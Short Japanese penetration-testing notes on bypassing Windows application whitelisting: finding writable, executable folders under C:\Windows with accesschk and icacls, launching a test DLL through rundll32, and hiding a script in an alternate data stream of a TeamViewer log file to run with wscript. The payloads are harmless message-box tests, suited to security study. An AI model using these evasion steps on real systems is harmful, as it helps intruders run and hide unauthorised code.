# 信頼済みフォルダーバイパス

accesschk.exe等で書き込み可能なC:\Windows上のフォルダを探索
```
accesschk.exe "student" C:\Windows -wus
```

例えばいかが書き込み可能なフォルダ
```
RW C:\Windows\Tasks
RW C:\Windows\Temp
RW C:\Windows\tracing
RW C:\Windows\Registration\CRMLog
```

実行も可能か確認（Xフラグが付いてれば実行可
```
icacls.exe C:\Windows\Tasks
```

# DLL Bypass
```
rundll32 C:\Tools\Test.dll,run
```

テスト用コード
```c
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```

#  Alternate Data Streams
ADSにコピー
```
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

書き込みを確認
```
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
```

コマンドラインから実行
```
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```
